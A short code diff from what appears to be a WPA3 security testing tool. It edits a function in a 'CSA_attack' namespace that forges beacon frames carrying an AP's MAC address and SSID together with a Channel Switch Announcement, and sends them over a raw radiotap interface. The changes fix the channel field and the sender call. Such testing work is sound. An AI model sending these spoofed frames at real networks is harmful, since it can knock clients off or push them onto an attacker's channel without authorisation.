@@ -35,7 +35,7 @@ namespace wpa3_tester::CSA_attack{
         beacon.addr2(ap_mac);
         beacon.addr3(ap_mac);
         beacon.ssid(ssid);
-        beacon.ds_parameter_set(new_channel);
+        beacon.ds_parameter_set(ap_channel);
 
         Dot11ManagementFrame::channel_switch_type cs;
         cs.switch_mode = 1;
@@ -50,8 +50,8 @@ namespace wpa3_tester::CSA_attack{
         radiotap.flags(RadioTap::FCS); // check FCS (can be invalid for some drivers)
 
         // TODO not very efective?
-        PacketSender sender(iface.name());
-        sender.send(radiotap, iface.name());
+        PacketSender sender;
+        sender.send(radiotap, iface);
     }
 
     auto check_vulnerable(
